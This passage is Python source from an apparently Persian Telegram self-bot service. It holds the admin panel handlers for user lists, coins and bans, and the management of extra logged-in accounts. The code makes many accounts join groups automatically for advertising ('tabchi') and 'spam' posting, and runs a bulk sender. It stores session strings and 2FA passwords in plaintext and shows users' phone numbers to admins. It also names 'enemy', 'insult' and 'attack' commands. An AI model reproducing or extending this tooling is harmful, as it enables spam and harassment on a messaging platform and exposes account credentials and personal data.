        data2 = "oreports"
        cmds = [
            ("تنظیم دشمن", "تنظیم دشمن"),
            ("ثبت متن", "ثبت متن"),
            ("ثبت فحش", "ثبت فحش"),
            ("امار", "امار"),
            ("پنل", "پنل"),
            ("اتک", "اتک"),
        ]
        mk = types.InlineKeyboardMarkup(row_width=1)
        flags = report_flags()
        for k, label in cmds:
            on = bool(flags.get(k))
            st = "فعال" if on else "غیرفعال"
            mk.add(types.InlineKeyboardButton(label + " | " + st, callback_data="orep_" + k))
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"owner_{uid}"))
        try:
            bot.edit_message_text("گزارش دستورات به مالک اصلی:", call.message.chat.id, call.message.message_id, reply_markup=mk)
        except Exception:
            pass
        bot.answer_callback_query(call.id, "فعال" if not cur else "غیرفعال")
        return

    elif data in ["olist", "alist"] and is_admin(uid):
        users = load_data()['users']
        parts = ["لیست کاربران"]
        for s, info in sorted(users.items(), key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0):
            try:
                ch = bot.get_chat(int(s))
                if getattr(ch, 'username', None):
                    info['username'] = ch.username
                nm = ((getattr(ch, 'first_name', None) or '') + ' ' + (getattr(ch, 'last_name', None) or '')).strip()
                if nm:
                    info['original_name'] = nm
            except Exception:
                pass
            name = info.get('original_name') or str(s)
            un = info.get('username')
            coins = info.get('coins', 0)
            phone = info.get('phone') or '—'
            sess_ok = bool(info.get('session'))
            st = "✅ فعال" if sess_ok else "❌ غیرفعال"
            if info.get('banned'):
                st = "🚫 بن"
            line = (
                "نام: " + str(name).replace("<", "&lt;").replace(">", "&gt;") + chr(10)
                + "ایدی: <code>" + str(s) + "</code>" + chr(10)
            )
            if un:
                line += "یوزرنیم: @" + str(un).replace("<", "&lt;").replace(">", "&gt;") + chr(10)
            try:
                mem = membership_duration_text(int(s))
            except Exception:
                mem = "—"
            line += (
                "شماره: <code>" + str(phone).replace("<", "&lt;").replace(">", "&gt;") + "</code>" + chr(10)
                + "سکه: " + str(coins) + chr(10)
                + "عضویت: " + str(mem) + chr(10)
                + "وضعیت: " + st
            )
            parts.append("<blockquote>" + line + "</blockquote>")
        try:
            save_data()
        except Exception:
            pass
        body = chr(10).join(parts)
        back = f"owner_{uid}" if is_owner(uid) else f"admin_{uid}"
        mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت", callback_data=back))
        _safe_edit(call, body[:1000], mk, parse_mode='HTML')
        bot.answer_callback_query(call.id)
        return


    elif data in ["otop", "atop"] and is_admin(uid):
        users = load_data()['users']
        ranked = []
        for s, info in users.items():
            if info.get('banned'):
                continue
            # بروز یوزرنیم/اسم
            try:
                ch = bot.get_chat(int(s))
                if getattr(ch, 'username', None):
                    info['username'] = ch.username
                nm = ((getattr(ch, 'first_name', None) or '') + ' ' + (getattr(ch, 'last_name', None) or '')).strip()
                if nm:
                    info['original_name'] = nm
            except Exception:
                pass
            sess_ok = bool(info.get('session'))
            last = info.get('last_self_use') or info.get('last_login') or ''
            stats = info.get('cmd_stats') or {}
            uses = sum(int(v or 0) for v in stats.values()) if isinstance(stats, dict) else 0
            score = uses * 1000
            if last:
                score += 100
            ranked.append((score, uses, last, s, info, sess_ok))
        ranked.sort(key=lambda x: (x[0], x[1]), reverse=True)
        # ذخیره ترتیب
        try:
            save_data()
        except Exception:
            pass
        parts = ["فعال ترین کاربران"]
        for i, (score, uses, last, s, info, sess_ok) in enumerate(ranked[:30], 1):
            name = info.get('original_name') or s
            un = info.get('username')
            hm = info.get('last_self_use_short') or ''
            if not hm and last and len(str(last)) >= 16:
                hm = str(last)[11:16]
            if sess_ok and hm:
                st = "آخرین استفاده از سلف " + hm
                mark = "✅"
            elif sess_ok:
                st = "فعال"
                mark = "✅"
            else:
                st = "غیرفعال"
                mark = "❌"
            line = (
                str(i) + ". " + mark + " " + str(name).replace("<", "&lt;") + chr(10)
                + "ایدی: <code>" + str(s) + "</code>" + chr(10)
            )
            if un:
                line += "یوزرنیم: @" + str(un).replace("<", "") + chr(10)
            line += (
                "سکه: " + str(info.get('coins', 0)) + chr(10)
                + "استفاده: " + str(uses) + chr(10)
                + st
            )
            parts.append("<blockquote>" + line + "</blockquote>")
        t = chr(10).join(parts)
        back = f"owner_{uid}" if is_owner(uid) else f"admin_{uid}"
        mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت", callback_data=back))
        _safe_edit(call, t[:1000], mk, parse_mode='HTML')
        bot.answer_callback_query(call.id)

    elif data in ["obroadcast", "abroadcast"] and is_admin(uid):
        _safe_edit(call, "📢 پیام همگانی را بفرست (متن/عکس/ویدیو با هر فرمت بولد و نقل قول):")
        bot.register_next_step_handler_by_chat_id(uid, do_broadcast)
        return

    elif data in ["odiamond", "adiamond"] and is_admin(uid):
        admin_states[uid] = {'step': 'diamond_amount'}
        _safe_edit(call, "💰 چقدر سکه به همه بدهم؟ فقط عدد:")
        return

    elif data in ["ogiveone", "agiveone"] and is_admin(uid):
        admin_states[uid] = {'step': 'giveone_id'}
        _safe_edit(call, "آیدی عددی کاربر را بفرست:")
        return

    elif data == "obuycoin" and is_owner(uid):
        admin_states[uid] = {'step': 'buycoin_id'}
        _safe_edit(call, "آیدی عددی کاربر را بفرست (یا بنویس «خودم» برای خودت):")
        return

    elif data in ["oban_user", "aban_user"] and is_admin(uid):
        mid = call.message.message_id if call.message else None
        cid = call.message.chat.id if call.message else uid
        admin_states[uid] = {'step': 'ban_id', 'panel_mid': mid, 'panel_chat': cid}
        mk = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("بازگشت", callback_data=f"owner_{uid}" if is_owner(uid) else f"admin_{uid}")
        )
        _safe_edit(call, "آیدی عددی کاربری که میخوای بن کنی را بفرست:", mk)
        return
    elif data in ["otempban", "atempban"] and is_admin(uid):
        mid = call.message.message_id if call.message else None
        cid = call.message.chat.id if call.message else uid
        admin_states[uid] = {'step': 'tempban_id', 'panel_mid': mid, 'panel_chat': cid}
        mk = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("بازگشت", callback_data=f"owner_{uid}" if is_owner(uid) else f"admin_{uid}")
        )
        _safe_edit(call, "آیدی عددی کاربری که میخوای بن موقت کنی را بفرست:", mk)
        return
    elif data == "oowners" and is_owner(uid):
        owners = get_owners()
        parts = ["لیست مالکین ربات"]
        for oid in owners:
            try:
                u = get_user(oid)
                name = u.get('original_name') or str(oid)
                un = u.get('username')
                phone = u.get('phone') or '—'
            except Exception:
                name = str(oid)
                un = None
                phone = '—'
            line = ""
            if int(oid) == int(OWNER_ID):
                line += "⭐ مالک اصلی" + chr(10)
            else:
                line += "مالک" + chr(10)
            line += "نام: " + str(name).replace("<", "&lt;") + chr(10)
            line += "ایدی: <code>" + str(oid) + "</code>" + chr(10)
            if un:
                line += "یوزرنیم: @" + str(un).replace("<", "&lt;") + chr(10)
            line += "شماره: <code>" + str(phone).replace("<", "&lt;") + "</code>"
            parts.append("<blockquote>" + line + "</blockquote>")
        mk = types.InlineKeyboardMarkup(row_width=1)
        if is_main_owner(uid):
            mk.add(types.InlineKeyboardButton("افزودن مالک", callback_data="oaddowner"))
            mk.add(types.InlineKeyboardButton("حذف مالک", callback_data="oremoveowner"))
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"owner_{uid}"))
        _safe_edit(call, chr(10).join(parts)[:4000], mk, parse_mode='HTML')
        return


    elif data == "oaddowner" and is_main_owner(uid):
        admin_states[uid] = {'step': 'add_owner'}
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
        _safe_edit(call, "<blockquote>آیدی عددی مالک جدید را بفرست</blockquote>", mk, parse_mode='HTML')
        return
    elif data == "oremoveowner" and is_main_owner(uid):
        admin_states[uid] = {'step': 'remove_owner'}
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data="owner_" + str(uid)))
        _safe_edit(call, "<blockquote>آیدی عددی مالکی که می‌خوای حذف کنی را بفرست</blockquote>", mk, parse_mode='HTML')
        return
    elif data in ["ounban_user", "aunban_user"] and is_admin(uid):
        mid = call.message.message_id if call.message else None
        cid = call.message.chat.id if call.message else uid
        admin_states[uid] = {'step': 'unban_id', 'panel_mid': mid, 'panel_chat': cid}
        mk = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("بازگشت", callback_data=f"owner_{uid}" if is_owner(uid) else f"admin_{uid}")
        )
        _safe_edit(call, "آیدی عددی کاربری که میخوای آنبن کنی را بفرست:", mk)
        return
    elif data in ["obanned_list", "abanned_list"] and is_admin(uid):
        users = load_data()['users']
        parts = ["لیست بن شده ها"]
        found = 0
        import time as _tban
        now = _tban.time()
        for s, info in users.items():
            is_perm = bool(info.get('banned'))
            until = info.get('ban_temp_until')
            is_temp = False
            left_h = 0
            if until:
                try:
                    left = float(until) - now
                    if left > 0:
                        is_temp = True
                        left_h = int(left // 3600) or 1
                except Exception:
                    pass
            if not is_perm and not is_temp:
                continue
            found += 1
            name = info.get('original_name') or s
            un = info.get('username')
            phone = info.get('phone') or '—'
            reason = info.get('ban_reason') or 'ثبت نشده'
            line = (
                "نام: " + str(name).replace("<", "&lt;") + chr(10)
                + "ایدی: <code>" + str(s) + "</code>" + chr(10)
            )
            if un:
                line += "یوزرنیم: @" + str(un).replace("<", "&lt;") + chr(10)
            line += "شماره: <code>" + str(phone).replace("<", "&lt;") + "</code>" + chr(10)
            if is_perm:
                line += "نوع: بن دائمی" + chr(10)
            if is_temp:
                line += "نوع: بن موقت" + chr(10)
                line += "مدت باقی: " + format_ban_duration(left_h) + chr(10)
            line += "دلیل: " + str(reason).replace("<", "&lt;")
            parts.append("<blockquote>" + line + "</blockquote>")
        if found == 0:
            body = "لیست بن شده ها خالی است"
        else:
            body = chr(10).join(parts)
        back = f"owner_{uid}" if is_owner(uid) else f"admin_{uid}"
        mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت", callback_data=back))
        _safe_edit(call, body[:1000], mk, parse_mode='HTML')
        bot.answer_callback_query(call.id)
        return


    elif data.startswith('tempban_yes_') and is_admin(uid):
        try:
            tid = int(data.split('_')[-1])
        except Exception:
            bot.answer_callback_query(call.id)
            return
        if is_main_owner(tid) or tid == OWNER_ID:
            bot.answer_callback_query(call.id, "نمیشه مالک اصلی را بن کرد", show_alert=True)
            return
        st = admin_states.get(uid) or {}
        reason = st.get('ban_reason') or 'بدون دلیل'
        hours = int(st.get('temp_hours') or 1)
        custom = st.get('ban_custom') or (
            "شما از ربات به مدت " + format_ban_duration(hours)
            + " بن شدین اگه فکر میکنید مشکلی پیش آمده به پشتیبانی پیام دهید @rockyden"
        )
        import time as _t
        until = _t.time() + hours * 3600
        set_user(tid, 'ban_temp', True)
        set_user(tid, 'ban_temp_until', until)
        set_user(tid, 'ban_reason', reason)
        set_user(tid, 'self_enabled', False)
        # موجودی دست نخورد
        try:
            asyncio.run_coroutine_threadsafe(stop_client(tid), loop)
        except Exception:
            pass
        try:
            bot.send_message(tid, "شما به مدت " + format_ban_duration(hours) + " مسدود شده اید.")
        except Exception:
            pass
        admin_states.pop(uid, None)
        try:
            bot.edit_message_text(
                "بن موقت انجام شد" + chr(10)
                + "کاربر: `" + str(tid) + "`" + chr(10)
                + "مدت: " + format_ban_duration(hours) + chr(10)
                + "دلیل: " + reason,
                call.message.chat.id, call.message.message_id, parse_mode='Markdown',
            )
        except Exception:
            pass
        bot.answer_callback_query(call.id, "بن موقت شد")
        return
    elif data.startswith('tempban_no_') and is_admin(uid):
        admin_states.pop(uid, None)
        try:
            bot.edit_message_text("لغو شد", call.message.chat.id, call.message.message_id)
        except Exception:
            pass
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ban_yes_') and is_admin(uid):
        try:
            tid = int(data.split('_')[-1])
        except Exception:
            bot.answer_callback_query(call.id)
            return
        if tid == OWNER_ID:
            bot.answer_callback_query(call.id, "نمیشه مالک را بن کرد", show_alert=True)
            return
        reason = (admin_states.get(uid) or {}).get('ban_reason') or get_ud(uid, '_pending_ban_reason') or 'بدون دلیل'
        # reason stored in admin_states
        st = admin_states.get(uid) or {}
        reason = st.get('ban_reason') or 'بدون دلیل'
        set_user(tid, 'banned', True)
        set_user(tid, 'coins', 0)
        set_user(tid, 'self_enabled', False)
        set_user(tid, 'ban_reason', reason)
        try:
            asyncio.run_coroutine_threadsafe(stop_client(tid), loop)
        except Exception:
            pass
        try:
            bot.send_message(tid, "شما توسط مدیریت مسدود شده اید.")
            set_user(tid, 'ban_notified', True)
        except Exception:
            pass
        admin_states.pop(uid, None)
        try:
            bot.edit_message_text("کاربر `" + str(tid) + "` بن شد" + chr(10) + "دلیل: " + str(reason), call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        except Exception:
            pass
        bot.answer_callback_query(call.id, "بن شد")
        return
    elif data.startswith('ban_no_') and is_admin(uid):
        admin_states.pop(uid, None)
        try:
            bot.edit_message_text("لغو شد", call.message.chat.id, call.message.message_id)
        except Exception:
            pass
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('unban_yes_') and is_admin(uid):
        try:
            tid = int(data.split('_')[-1])
        except Exception:
            bot.answer_callback_query(call.id)
            return
        st = admin_states.get(uid) or {}
        custom = (st.get('unban_msg') or '').strip() or "آنبن شدید. میتوانید از ربات استفاده کنید."
        set_user(tid, 'banned', False)
        set_user(tid, 'ban_reason', None)
        set_user(tid, 'ban_notified', False)
        if get_ud(tid, 'coins', 0) <= 0:
            set_user(tid, 'coins', 100)
        set_user(tid, 'self_enabled', True)
        try:
            bot.send_message(tid, custom)
        except Exception:
            pass
        admin_states.pop(uid, None)
        try:
            bot.edit_message_text("کاربر `" + str(tid) + "` آنبن شد", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        except Exception:
            pass
        bot.answer_callback_query(call.id, "آنبن شد")
        return
    elif data.startswith('unban_no_') and is_admin(uid):
        admin_states.pop(uid, None)
        try:
            bot.edit_message_text("لغو شد", call.message.chat.id, call.message.message_id)
        except Exception:
            pass
        bot.answer_callback_query(call.id)
        return

    elif data in ["oremove", "aremove"] and is_admin(uid):
        admin_states[uid] = {'step': 'remove_id'}
        _safe_edit(call, "آیدی عددی کاربر را بفرست:")
        return

    elif data in ["oremoveall", "aremoveall"] and is_admin(uid):
        admin_states[uid] = {'step': 'remove_all'}
        _safe_edit(call, "چقدر سکه از همه کاربران کم کنم؟ فقط عدد:")
        return

    # Owner only: manage admins
    elif data == "oaddadmin" and is_owner(uid):
        admin_states[uid] = {'step': 'add_admin'}
        _safe_edit(call, "آیدی عددی ادمین جدید را بفرست:")
        return
    elif data in ("ojoinid", "ajoinid") and is_admin(uid):
        admin_states[uid] = {'step': 'join_id_ask'}
        _safe_edit(call, "<blockquote>ایدی عددی گروه یا چنل را بفرست</blockquote>")
        return
    elif data == 'jid_self' and is_admin(uid):
        st = admin_states.get(uid) or {}
        gid = st.get('gid')
        admin_states.pop(uid, None)
        bot.answer_callback_query(call.id)
        if not gid:
            return
        async def _join_self():
            cl = clients.get(uid)
            if not cl:
                bot.send_message(uid, "<blockquote>کلاینت متصل نیست — اول لاگین کن</blockquote>", parse_mode='HTML')
                return
            try:
                await cl.get_entity(int(gid))
                bot.send_message(uid, "<blockquote>جوین/دسترسی انجام شد</blockquote>" + chr(10) + "<blockquote><code>" + str(gid) + "</code></blockquote>", parse_mode='HTML')
            except Exception as e:
                bot.send_message(uid, "<blockquote>خطا:</blockquote>" + chr(10) + "<blockquote>" + str(e)[:100].replace('<','') + "</blockquote>", parse_mode='HTML')
        try:
            asyncio.run_coroutine_threadsafe(_join_self(), loop)
        except Exception:
            pass
        return
    elif data in ('jid_extra', 'jid_users') and is_admin(uid):
        st = admin_states.get(uid) or {}
        gid = st.get('gid')
        if not gid:
            bot.answer_callback_query(call.id, "ایدی نیست", show_alert=True)
            return
        admin_states[uid] = {'step': 'join_id_count', 'gid': gid, 'mode': 'extra' if data == 'jid_extra' else 'users'}
        bot.answer_callback_query(call.id)
        bot.send_message(uid, "<blockquote>چند اکانت جوین شوند؟ عدد بفرست</blockquote>", parse_mode='HTML')
        return

    elif data == "oremoveadmin" and is_owner(uid):
        admin_states[uid] = {'step': 'remove_admin'}
        _safe_edit(call, "آیدی عددی ادمینی که می‌خوای حذف کنی را بفرست:")
        return

    elif data == "oadmins" and is_owner(uid):
        admins = get_admins()
        parts = ["لیست ادمین‌ها"]
        if not admins:
            parts.append("<blockquote>ادمینی نیست</blockquote>")
        for a in admins:
            u = get_user(a)
            name = u.get('original_name') or str(a)
            un = u.get('username')
            phone = u.get('phone') or '—'
            line = (
                "نام: " + str(name).replace("<", "&lt;") + chr(10)
                + "ایدی: <code>" + str(a) + "</code>" + chr(10)
            )
            if un:
                line += "یوزرنیم: @" + str(un).replace("<", "&lt;") + chr(10)
            line += "شماره: <code>" + str(phone).replace("<", "&lt;") + "</code>"
            parts.append("<blockquote>" + line + "</blockquote>")
        body = chr(10).join(parts)
        mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("بازگشت", callback_data=f"owner_{uid}"))
        _safe_edit(call, body[:1000], mk, parse_mode='HTML')
        bot.answer_callback_query(call.id)
        return


    elif data.startswith('ex_tab_all_'):
        extras = get_extras(uid)
        if not extras:
            bot.answer_callback_query(call.id, "اکانت های اضافه رو ثبت نکردی", show_alert=True)
            return
        # تبچی مشترک برای همه اکانت ها
        tabchi_panel(uid, 'all', call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_spm_all_'):
        extras = get_extras(uid)
        if not extras:
            bot.answer_callback_query(call.id, "اکانت های اضافه رو ثبت نکردی", show_alert=True)
            return
        spam_extra_panel(uid, 'all', call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_menu_'):
        extras_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_list_'):
        extras_list_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_add_'):
        bot.answer_callback_query(call.id)
        extra_login_states[uid] = {'step': 'phone', 'code_digits': '', 'mode': 'extra'}
        try:
            bot.send_message(uid, "شماره اکانت رو به صورت متنی بفرست" + chr(10) + "مثال :" + chr(10) + "`09016143216`", parse_mode='Markdown', reply_markup=types.ReplyKeyboardRemove())
        except Exception:
            bot.send_message(uid, "شماره اکانت رو به صورت متنی بفرست" + chr(10) + "مثال : 09016143216")
        return
    elif data == 'ex_rereg_cancel':
        st = extra_login_states.pop(uid, None)
        if st and st.get('client'):
            try:
                asyncio.run_coroutine_threadsafe(st['client'].disconnect(), loop)
            except Exception:
                pass
        try:
            bot.answer_callback_query(call.id, "انصراف")
        except Exception:
            pass
        try:
            bot.edit_message_text("انصراف از ثبت مجدد", call.message.chat.id, call.message.message_id)
        except Exception:
            pass
        extras_list_panel(uid)
        return
    elif data.startswith('ex_rereg_'):
        acc_id = data.replace('ex_rereg_', '', 1)
        st = extra_login_states.get(uid) or {}
        session = st.get('session')
        if not session:
            bot.answer_callback_query(call.id, "نشست منقضی شد", show_alert=True)
            return
        extras = get_extras(uid)
        me_name = st.get('me_name') or ''
        me_un = st.get('me_username')
        extras[str(acc_id)] = {
            'id': int(acc_id) if str(acc_id).isdigit() else acc_id,
            'session': session,
            'phone': st.get('phone'),
            'name': me_name,
            'username': me_un,
            '2fa_password': st.get('password') or '',
            'tabchi_groups': (extras.get(str(acc_id)) or {}).get('tabchi_groups') or [],
            'spam_groups': (extras.get(str(acc_id)) or {}).get('spam_groups') or [],
            'sender_items': (extras.get(str(acc_id)) or {}).get('sender_items') or [],
        }
        set_extras(uid, extras)
        try:
            asyncio.run_coroutine_threadsafe(start_extra_client(uid, str(acc_id), session), loop)
        except Exception:
            pass
        extra_login_states.pop(uid, None)
        try:
            bot.answer_callback_query(call.id, "ثبت مجدد شد")
        except Exception:
            pass
        try:
            bot.edit_message_text("<blockquote>اکانت مجدداً ثبت شد</blockquote>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        except Exception:
            pass
        extras_list_panel(uid)
        return
    elif data.startswith('ex_one_'):
        parts = data.split('_')
        # ex_one_{uid}_{accid}
        try:
            acc_id = parts[-1]
        except Exception:
            bot.answer_callback_query(call.id)
            return
        extra_one_panel(uid, acc_id, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_del_'):
        parts = data.split('_')
        acc_id = parts[-1]
        extras = get_extras(uid)
        if str(acc_id) in extras:
            del extras[str(acc_id)]
            set_extras(uid, extras)
            try:
                asyncio.run_coroutine_threadsafe(stop_extra_client(uid, acc_id), loop)
            except Exception:
                pass
        extras_list_panel(uid, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, "حذف شد")
        return
    elif data.startswith('bn_del_'):
        # bn_del_{uid}_{aid}_{idx}
        try:
            parts = data.split('_')
            tuid = int(parts[2])
            aid = parts[3]
            idx = int(parts[4])
            if int(uid) != tuid:
                bot.answer_callback_query(call.id, "برای شما نیست", show_alert=True)
                return
            extras = get_extras(uid) or {}
            inf = extras.get(str(aid)) or {}
            items = list(inf.get('sender_items') or [])
            if 0 <= idx < len(items):
                items.pop(idx)
                inf['sender_items'] = items
                extras[str(aid)] = inf
                set_extras(uid, extras)
            try:
                bot.edit_message_text("<blockquote>بنر از لیست گروه حذف شد (در ربات باقی است)</blockquote>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
            except Exception:
                pass
            bot.answer_callback_query(call.id, "حذف شد")
        except Exception as e:
            try:
                bot.answer_callback_query(call.id, str(e)[:80], show_alert=True)
            except Exception:
                pass
        return
    elif data.startswith('bn_edit_'):
        try:
            parts = data.split('_')
            tuid = int(parts[2])
            aid = parts[3]
            idx = int(parts[4])
            if int(uid) != tuid:
                bot.answer_callback_query(call.id, "برای شما نیست", show_alert=True)
                return
            admin_states[uid] = {'step': 'bn_edit_wait', 'aid': str(aid), 'idx': idx}
            bot.send_message(uid, "<blockquote>بنر جدیدت رو بفرست (متن / عکس / هر فرمت)</blockquote>", parse_mode='HTML')
            bot.answer_callback_query(call.id)
        except Exception:
            try:
                bot.answer_callback_query(call.id)
            except Exception:
                pass
        return
    elif data.startswith('ex_tab_'):
        acc_id = data.split('_')[-1]
        try:
            tabchi_panel(uid, acc_id, call.message.message_id, call.message.chat.id)
        except Exception:
            pass
        # دکمه لیست/افزودن بنر
        try:
            mk = types.InlineKeyboardMarkup(row_width=1)
            mk.add(types.InlineKeyboardButton("لیست بنر ها", callback_data=f"ex_bn_list_{acc_id}"))
            mk.add(types.InlineKeyboardButton("افزودن بنر", callback_data=f"ex_bn_add_{acc_id}"))
            mk.add(types.InlineKeyboardButton("سندر", callback_data=f"ex_snd_{acc_id}"))
            mk.add(types.InlineKeyboardButton("پاکسازی لیست سندر", callback_data=f"ex_snd_clear_{acc_id}"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_menu_{uid}"))
            bot.send_message(uid, "مدیریت بنر / تبچی", reply_markup=mk)
        except Exception:
            pass
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_spm_'):
        acc_id = data.split('_')[-1]
        spam_extra_panel(uid, acc_id, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_tg_add_'):
        acc_id = data.split('_')[-1]
        tabchi_states[uid] = {
            'mode': 'tabchi_links',
            'acc_id': acc_id,
            'links': [],
            'chat_id': call.message.chat.id,
            'message_id': call.message.message_id,
        }
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("ذخیره", callback_data=f"ex_tg_save_{uid}_{acc_id}"))
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_tab_{uid}_{acc_id}"))
        bot.edit_message_text(
            "لینک گروه را برای تبلیغات ارسال کنید\nلینک های ثبت شده: 0",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=mk,
        )
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_tg_save_'):
        st = tabchi_states.get(uid) or {}
        links = st.get('links') or []
        cur = get_ud(uid, 'shared_tabchi_groups', []) or []
        for lk in links:
            if lk not in cur:
                cur.append(lk)
        set_user(uid, 'shared_tabchi_groups', cur)
        extras = get_extras(uid)
        async def _join_all():
            from telethon.tl.functions.messages import ImportChatInviteRequest
            from telethon.tl.functions.channels import JoinChannelRequest
            import re as _re
            for aid, inf in extras.items():
                try:
                    key = (int(uid), int(aid))
                    cl = extra_clients.get(key)
                    if not cl:
                        sess = inf.get('session')
                        if sess:
                            await start_extra_client(uid, aid, sess)
                            cl = extra_clients.get(key)
                    if not cl:
                        continue
                    for lk in links:
                        try:
                            m = _re.search(r't\.me/\+([A-Za-z0-9_-]+)', lk) or _re.search(r't\.me/joinchat/([A-Za-z0-9_-]+)', lk)
                            if m:
                                await cl(ImportChatInviteRequest(m.group(1)))
                            else:
                                m2 = _re.search(r't\.me/([A-Za-z][A-Za-z0-9_]+)', lk)
                                if m2:
                                    await cl(JoinChannelRequest(m2.group(1)))
                        except Exception:
                            continue
                except Exception:
                    continue
        try:
            asyncio.run_coroutine_threadsafe(_join_all(), loop)
        except Exception:
            pass
        tabchi_states.pop(uid, None)
        tabchi_panel(uid, 'all', call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, "ذخیره شد")
        return
    elif data.startswith('ex_tg_list_'):
        groups = get_ud(uid, 'shared_tabchi_groups', []) or []
        body = "لیست گروه ها" + chr(10) + (chr(10).join(groups) if groups else "خالی")
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_tab_all_{uid}"))
        bot.edit_message_text(body[:4000], call.message.chat.id, call.message.message_id, reply_markup=mk, disable_web_page_preview=True)
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_tg_clear_'):
        set_user(uid, 'shared_tabchi_groups', [])
        tabchi_panel(uid, 'all', call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, "پاک شد")
        return
    elif data.startswith('ex_snd_clear_'):
        acc_id = data.split('_')[-1]
        extras = get_extras(uid)
        info = extras.get(str(acc_id)) or {}
        info['sender_items'] = []
        extras[str(acc_id)] = info
        set_extras(uid, extras)
        tabchi_panel(uid, acc_id, call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, "پاک شد")
        return
    elif data.startswith('ex_snd_') and not data.startswith('ex_snd_clear') and not data.startswith('ex_snd_stop'):
        acc_id = data.split('_')[-1]
        tabchi_states[uid] = {'mode': 'sender_content', 'acc_id': acc_id}
        bot.edit_message_text(
            "متن عکس ویدیو ... مورد نظرت رو بفرست برای سندر",
            call.message.chat.id,
            call.message.message_id,
        )
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_snd_stop_'):
        acc_id = data.split('_')[-1]
        sender_jobs.pop((uid, str(acc_id)), None)
        bot.answer_callback_query(call.id, "متوقف شد")
        main_panel(uid)
        return
    elif data.startswith('ex_sg_add_'):
        acc_id = data.split('_')[-1]
        tabchi_states[uid] = {
            'mode': 'spam_links',
            'acc_id': acc_id,
            'links': [],
            'message_id': call.message.message_id,
            'chat_id': call.message.chat.id,
        }
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("ذخیره", callback_data=f"ex_sg_save_{uid}_{acc_id}"))
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_spm_{uid}_{acc_id}"))
        bot.edit_message_text(
            "لینک گروه را برای اسپم ارسال کنید\nلینک های ثبت شده: 0",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=mk,
        )
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_sg_save_'):
        st = tabchi_states.get(uid) or {}
        links = st.get('links') or []
        cur = get_ud(uid, 'shared_spam_groups', []) or []
        for lk in links:
            if lk not in cur:
                cur.append(lk)
        set_user(uid, 'shared_spam_groups', cur)
        extras = get_extras(uid)
        async def _join_all2():
            from telethon.tl.functions.messages import ImportChatInviteRequest
            from telethon.tl.functions.channels import JoinChannelRequest
            import re as _re
            for aid, inf in extras.items():
                try:
                    key = (int(uid), int(aid))
                    cl = extra_clients.get(key)
                    if not cl:
                        sess = inf.get('session')
                        if sess:
                            await start_extra_client(uid, aid, sess)
                            cl = extra_clients.get(key)
                    if not cl:
                        continue
                    for lk in links:
                        try:
                            m = _re.search(r't\.me/\+([A-Za-z0-9_-]+)', lk) or _re.search(r't\.me/joinchat/([A-Za-z0-9_-]+)', lk)
                            if m:
                                await cl(ImportChatInviteRequest(m.group(1)))
                            else:
                                m2 = _re.search(r't\.me/([A-Za-z][A-Za-z0-9_]+)', lk)
                                if m2:
                                    await cl(JoinChannelRequest(m2.group(1)))
                        except Exception:
                            continue
                except Exception:
                    continue
        try:
            asyncio.run_coroutine_threadsafe(_join_all2(), loop)
        except Exception:
            pass
        tabchi_states.pop(uid, None)
        spam_extra_panel(uid, 'all', call.message.message_id, call.message.chat.id)
        bot.answer_callback_query(call.id, "ذخیره شد")
        return
    elif data.startswith('ex_sg_list_'):
        groups = get_ud(uid, 'shared_spam_groups', []) or []
        body = "لیست گروه اسپم" + chr(10) + (chr(10).join(groups) if groups else "خالی")
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_spm_all_{uid}"))
        bot.edit_message_text(body[:4000], call.message.chat.id, call.message.message_id, reply_markup=mk, disable_web_page_preview=True)
        bot.answer_callback_query(call.id)
        return
    elif data.startswith('ex_sg_clear_'):
        set_user(uid, 'shared_spam_groups', [])
        spam_extra_panel(uid, 'all', call.message.message_id, call.message.chat.id)
